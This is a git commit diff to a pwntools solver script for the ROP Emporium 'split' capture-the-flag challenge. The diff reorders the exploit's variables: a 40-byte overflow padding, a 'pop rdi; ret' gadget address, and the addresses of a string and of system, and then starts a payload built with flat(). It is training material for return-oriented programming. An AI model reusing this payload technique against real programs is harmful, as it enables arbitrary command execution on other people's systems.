400ff49736924aa5332e604a5220d0d3bf0c69e1
moonlitrepo <revalinoalvian10@gmail.com>
2026-09-23 09:18:31 +0700

    Refactor padding and rdi_ret variable definitions

--- pwn/rop-emporium/split/solver.py
+++ pwn/rop-emporium/split/solver.py
@@ -2,11 +2,10 @@ from pwn import *
 
 elf = context.binary = ELF("./split")
 
+padding = b'a'*0x28 #40 byte
+rdi_ret = 0x4007c3
 string = 0x601060
 system = 0x40074b
-rdi_ret = 0x4007c3
-padding = b'a'*0x28 #40 byte
-
 
 pay = flat(
     padding,
